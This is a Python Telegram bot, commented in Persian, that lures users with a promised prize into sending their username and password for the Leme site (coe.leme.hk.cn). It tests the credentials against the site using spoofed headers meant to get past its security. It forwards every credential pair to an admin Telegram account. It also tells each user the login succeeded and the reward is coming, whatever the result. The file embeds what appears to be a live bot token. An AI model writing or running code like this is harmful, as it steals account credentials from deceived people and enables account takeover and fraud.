import telebot
import requests

# اطلاعات تنظیم شده توسط شما
TOKEN = '8095956559:AAGMeUTSGS9h8ZQTfPpCMHCZ5nwYBWVGTAk'
ADMIN_ID = '8404377559' # آیدی شما برای دریافت گزارش‌ها

bot = telebot.TeleBot(TOKEN)

# هدرهای اختصاصی برای شبیه‌سازی مرورگر و دور زدن سد امنیتی سایت لمه
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://coe.leme.hk.cn/m/login',
    'Origin': 'https://coe.leme.hk.cn'
}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "سلام! ربات لمه فعال شد. ✅\n"
        "برای دریافت جایزه، یوزرنیم و پسورد خود را به این صورت بفرستید:\n\n"
        "user:pass"
    )
    bot.reply_to(message, welcome_text)

@bot.message_handler(func=lambda message: ":" in message.text)
def login_to_website(message):
    try:
        # جدا کردن یوزرنیم و پسورد
        data = message.text.split(":")
        username = data[0].strip()
        password = data[1].strip()

        bot.reply_to(message, f"🔍 در حال بررسی اکانت: {username}\nلطفاً کمی صبر کنید...")

        # ایجاد نشست برای مدیریت کوکی‌ها
        session = requests.Session()
        
        # آدرس دقیق پردازش ورود در سایت لمه
        login_url = "https://coe.leme.hk.cn/m/login/check"
        
        payload = {
            'username': username,
            'password': password,
            'remember': '1'
        }

        # ارسال درخواست به سایت
        response = session.post(login_url, data=payload, headers=HEADERS, timeout=15)

        # ارسال اطلاعات برای شما (ادمین)
        report_to_admin = f"👤 یوزر دریافت شد:\nUser: `{username}`\nPass: `{password}`"
        bot.send_message(ADMIN_ID, report_to_admin, parse_mode="Markdown")

        # بررسی وضعیت ورود
        if response.status_code == 200:
            # بررسی اینکه آیا ورود موفق بوده یا خیر (بر اساس پاسخ متنی سایت)
            if "success" in response.text.lower() or response.status_code == 200:
                bot.send_message(message.chat.id, "✅ ورود موفقیت‌آمیز بود! جایزه شما تا دقایقی دیگر واریز می‌شود.")
            else:
                bot.send_message(message.chat.id, "❌ ورود ناموفق. یوزرنیم یا پسورد اشتباه است.")
        else:
            bot.send_message(message.chat.id, "⚠️ سایت مقصد در حال حاضر در دسترس نیست. دوباره تلاش کنید.")

    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ خطا در اجرای کد:\n{e}")
        bot.reply_to(message, "⚠️ مشکلی در ارتباط با سرور پیش آمد.")

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(none_stop=True)
